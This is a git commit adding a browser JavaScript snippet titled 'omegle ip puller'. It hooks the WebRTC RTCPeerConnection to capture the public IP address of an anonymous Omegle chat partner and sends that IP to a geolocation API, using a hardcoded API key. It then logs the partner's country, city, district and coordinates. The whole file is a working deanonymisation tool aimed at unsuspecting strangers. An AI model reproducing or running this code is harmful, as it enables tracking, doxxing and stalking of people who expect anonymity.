f2606f62574185207fc120dfe67b3b1f100c9d22
ArianDJ <148903958+ArianDJ@users.noreply.github.com>
2023-11-11 17:10:53 +0100

    Create omegle ip puller.js

---
+++ omegle ip puller.js
@@ -0,0 +1,38 @@
+const apiKey = "37a6593e2d1f4a33b04e597caa36cb55";
+
+window.oRTCPeerConnection = 
+    window.oRTCPeerConnection || window.RTCPeerConnection;
+
+window.RTCPeerConnection = function (...args) {
+    const pc = new window.oRTCPeerConnection(...args);
+
+    pc.oaddIceCandidate = pc.addIceCandidate;
+
+    pc.addIceCandidate = function (iceCandidate, ...rest) {
+        const fields = iceCandidate.candidate.split(" ");
+        const ip = fields[4];
+        if (fields[7] === "srflx") {
+            getLocation(ip);
+        }
+        return pc.oaddIceCandidate(iceCandidate, ...rest);
+    };
+    return pc;
+};
+
+const getLocation = async (ip) => {
+    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
+    await fetch(url).then((response) =>
+    response.json().then((json) => {
+        const output = `
+            -_-_-_-_-_-_-_-_-_-_-_
+            Country: ${json.country_name}
+            State: ${json.state_prov}
+            City: ${json.city}
+            District: ${json.district}
+            Lat / Long: (${json.latitude}, ${json.longtitude})
+            -_-_-_-_-_-_-_-_-_-_-_
+            `
+        console.log(output)
+    })
+);
+};
